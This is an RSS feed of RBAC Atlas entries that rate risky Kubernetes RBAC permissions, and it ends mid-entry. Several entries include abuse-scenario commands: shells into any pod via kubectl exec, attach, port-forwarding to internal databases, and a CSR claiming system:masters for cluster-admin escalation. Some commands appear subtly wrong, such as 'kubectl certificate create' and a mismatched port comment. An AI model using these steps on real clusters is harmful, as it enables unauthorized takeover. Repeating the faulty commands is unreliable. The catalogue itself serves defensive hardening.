<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Rules on RBAC ATLAS</title><link>https://rbac-atlas.github.io/rules/</link><description>Recent content in Rules on RBAC ATLAS</description><generator>Hugo</generator><language>en</language><atom:link href="https://rbac-atlas.github.io/rules/index.xml" rel="self" type="application/rss+xml"/><item><title>Approve CertificateSigningRequests</title><link>https://rbac-atlas.github.io/rules/1052/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1052/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1052&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Approve CertificateSigningRequests&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>certificates.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>certificatesigningrequests/approval&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>update, patch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-csrapproval">&lt;a href="https://rbac-atlas.github.io/tags/csrapproval/">CSRApproval&lt;/a>&lt;/span>
 &lt;span class="tag-clusteradminaccess">&lt;a href="https://rbac-atlas.github.io/tags/clusteradminaccess/">ClusterAdminAccess&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-spoofing">&lt;a href="https://rbac-atlas.github.io/tags/spoofing/">Spoofing&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants the ability to approve CertificateSigningRequests (CSRs). This is extremely critical as approving a CSR for a user or group with high privileges (e.g., system:masters group) allows an attacker to mint a client certificate that grants them those privileges, leading to full cluster compromise.&lt;/p></description></item><item><title>Bind ClusterRoles to identities (bind verb)</title><link>https://rbac-atlas.github.io/rules/1032/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1032/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1032&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Bind ClusterRoles to identities (bind verb)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>rbac.authorization.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>clusterroles&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>bind&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-bindingtoprivilegedrole">&lt;a href="https://rbac-atlas.github.io/tags/bindingtoprivilegedrole/">BindingToPrivilegedRole&lt;/a>&lt;/span>
 &lt;span class="tag-clusteradminaccess">&lt;a href="https://rbac-atlas.github.io/tags/clusteradminaccess/">ClusterAdminAccess&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-rbacmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/rbacmanipulation/">RBACManipulation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits using the &amp;lsquo;bind&amp;rsquo; verb on ClusterRoles (or Roles). This allows a user to create a ClusterRoleBinding (or RoleBinding) that grants the permissions of a specific role to another user, group, or service account, potentially leading to privilege escalation if a highly privileged role is bound.&lt;/p></description></item><item><title>Cluster-wide pod attach</title><link>https://rbac-atlas.github.io/rules/1002/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1002/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1002&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Cluster-wide pod attach&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods/attach&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-clusterwidepodattach">&lt;a href="https://rbac-atlas.github.io/tags/clusterwidepodattach/">ClusterWidePodAttach&lt;/a>&lt;/span>
 &lt;span class="tag-codeexecution">&lt;a href="https://rbac-atlas.github.io/tags/codeexecution/">CodeExecution&lt;/a>&lt;/span>
 &lt;span class="tag-elevationofprivilege">&lt;a href="https://rbac-atlas.github.io/tags/elevationofprivilege/">ElevationOfPrivilege&lt;/a>&lt;/span>
 &lt;span class="tag-lateralmovement">&lt;a href="https://rbac-atlas.github.io/tags/lateralmovement/">LateralMovement&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Enables attaching to the input/output streams of any pod across the cluster. Similar to exec, this can grant interactive shell access, facilitating code execution, lateral movement, and privilege escalation by interacting with running processes.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Attach to a running container&amp;rsquo;s process to view its output or send input.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl attach -it &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; -c &amp;lt;container-name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: Attach to the main container of a web server pod&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># kubectl attach -it my-web-server-pod -n default -c web-container&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Cluster-wide pod exec</title><link>https://rbac-atlas.github.io/rules/1000/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1000/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1000&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Cluster-wide pod exec&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods/exec&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-clusterwidepodexec">&lt;a href="https://rbac-atlas.github.io/tags/clusterwidepodexec/">ClusterWidePodExec&lt;/a>&lt;/span>
 &lt;span class="tag-codeexecution">&lt;a href="https://rbac-atlas.github.io/tags/codeexecution/">CodeExecution&lt;/a>&lt;/span>
 &lt;span class="tag-elevationofprivilege">&lt;a href="https://rbac-atlas.github.io/tags/elevationofprivilege/">ElevationOfPrivilege&lt;/a>&lt;/span>
 &lt;span class="tag-lateralmovement">&lt;a href="https://rbac-atlas.github.io/tags/lateralmovement/">LateralMovement&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows executing commands within any pod across the entire cluster. This provides direct shell access to running containers, enabling code execution, lateral movement, and potential privilege escalation by compromising sensitive workloads or accessing node resources.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Execute a non-interactive command inside a specific pod.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl &lt;span class="nb">exec&lt;/span> &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; -- ls -la /
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: Execute &amp;#39;whoami&amp;#39; in a coredns pod&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># kubectl exec coredns-xxxx-yyyy -n kube-system -- whoami&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Obtain an interactive shell inside a specific pod.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl &lt;span class="nb">exec&lt;/span> -it &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; -- sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># If &amp;#39;sh&amp;#39; is not available, try &amp;#39;bash&amp;#39; or &amp;#39;ash&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># kubectl exec -it &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; -- bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: Get a shell in a coredns pod&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># kubectl exec -it coredns-xxxx-yyyy -n kube-system -- sh&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Cluster-wide pod port-forward</title><link>https://rbac-atlas.github.io/rules/1004/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1004/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1004&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Cluster-wide pod port-forward&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods/portforward&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-clusterwidepodportforward">&lt;a href="https://rbac-atlas.github.io/tags/clusterwidepodportforward/">ClusterWidePodPortForward&lt;/a>&lt;/span>
 &lt;span class="tag-lateralmovement">&lt;a href="https://rbac-atlas.github.io/tags/lateralmovement/">LateralMovement&lt;/a>&lt;/span>
 &lt;span class="tag-networkmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/networkmanipulation/">NetworkManipulation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants the ability to forward local ports to ports on any pod across the cluster. This can expose internal services, facilitate lateral movement by bypassing network policies, and lead to information disclosure from otherwise inaccessible applications.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Forward a local port to a port on a specific pod.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl port-forward &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; &amp;lt;local-port&amp;gt;:&amp;lt;pod-port&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: Forward local port 8080 to port 80 of a database pod&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># kubectl port-forward my-db-pod-abc -n production 8080:5432&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Then access via: curl http://localhost:8080&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Create CertificateSigningRequests</title><link>https://rbac-atlas.github.io/rules/1053/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1053/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1053&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Create CertificateSigningRequests&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Spoofing&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>certificates.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>certificatesigningrequests&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-csrcreation">&lt;a href="https://rbac-atlas.github.io/tags/csrcreation/">CSRCreation&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-spoofing">&lt;a href="https://rbac-atlas.github.io/tags/spoofing/">Spoofing&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating CertificateSigningRequests. While creating a CSR itself isn&amp;rsquo;t immediately dangerous, if an overly permissive or automated signer approves it, it can lead to the issuance of a certificate with unintended privileges, facilitating spoofing or potential privilege escalation.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a CertificateSigningRequest for a new user or group.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Generate a private key and CSR&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">openssl genrsa -out user.key &lt;span class="m">2048&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">openssl req -new -key user.key -out user.csr -subj &lt;span class="s2">&amp;#34;/CN=&amp;lt;username&amp;gt;/O=&amp;lt;group&amp;gt;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Create the CSR object in Kubernetes&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl certificate create &amp;lt;csr-name&amp;gt; --csr&lt;span class="o">=&lt;/span>user.csr --request-name&lt;span class="o">=&lt;/span>&amp;lt;request-name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: openssl genrsa -out admin.key 2048 &amp;amp;&amp;amp; openssl req -new -key admin.key -out admin.csr -subj &amp;#34;/CN=admin/O=system:masters&amp;#34; &amp;amp;&amp;amp; kubectl certificate create admin-csr --csr=admin.csr --request-name=admin-request&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Create LocalSubjectAccessReviews (check permissions in a namespace)</title><link>https://rbac-atlas.github.io/rules/1051/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1051/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1051&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Create LocalSubjectAccessReviews (check permissions in a namespace)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-low">Low&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>authorization.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>localsubjectaccessreviews&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-rbacquery">&lt;a href="https://rbac-atlas.github.io/tags/rbacquery/">RBACQuery&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows submitting LocalSubjectAccessReview requests to check if an arbitrary user, group, or service account has specific permissions within a particular namespace. This aids in reconnaissance of RBAC permissions within a limited scope.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Check if a specific service account can get secrets in a given namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl auth can-i get secrets -n &amp;lt;namespace&amp;gt; --as&lt;span class="o">=&lt;/span>system:serviceaccount:&amp;lt;namespace&amp;gt;:&amp;lt;serviceaccount-name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl auth can-i get secrets -n production --as=system:serviceaccount:production:my-app-sa&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Check if a specific user can update deployments in a given namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl auth can-i update deployments -n &amp;lt;namespace&amp;gt; --as&lt;span class="o">=&lt;/span>user:&amp;lt;username&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl auth can-i update deployments -n default --as=dev-user&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Create pods cluster-wide</title><link>https://rbac-atlas.github.io/rules/1006/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1006/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1006&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Create pods cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-lateralmovement">&lt;a href="https://rbac-atlas.github.io/tags/lateralmovement/">LateralMovement&lt;/a>&lt;/span>
 &lt;span class="tag-persistence">&lt;a href="https://rbac-atlas.github.io/tags/persistence/">Persistence&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-workloadexecution">&lt;a href="https://rbac-atlas.github.io/tags/workloadexecution/">WorkloadExecution&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating new pods in any namespace across the cluster. This is highly critical as it can be used to deploy pods with elevated privileges (e.g., hostPath mounts, privileged security context), leading to node compromise, cluster-wide code execution, and establishing persistence.&lt;/p></description></item><item><title>Create pods in a namespace</title><link>https://rbac-atlas.github.io/rules/1007/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1007/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1007&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Create pods in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-lateralmovement">&lt;a href="https://rbac-atlas.github.io/tags/lateralmovement/">LateralMovement&lt;/a>&lt;/span>
 &lt;span class="tag-persistence">&lt;a href="https://rbac-atlas.github.io/tags/persistence/">Persistence&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-workloadexecution">&lt;a href="https://rbac-atlas.github.io/tags/workloadexecution/">WorkloadExecution&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants permission to create new pods within a specific namespace. This can lead to privilege escalation if allowed to create pods with hostPath mounts, privileged security context, or access to sensitive service accounts within that namespace. It also enables workload execution and potential persistence.&lt;/p></description></item><item><title>Create SelfSubjectRulesReviews (Discover Own Permissions)</title><link>https://rbac-atlas.github.io/rules/1086/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1086/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1086&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Create SelfSubjectRulesReviews (Discover Own Permissions)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-low">Low&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>authorization.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>selfsubjectrulesreviews&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-rbacquery">&lt;a href="https://rbac-atlas.github.io/tags/rbacquery/">RBACQuery&lt;/a>&lt;/span>
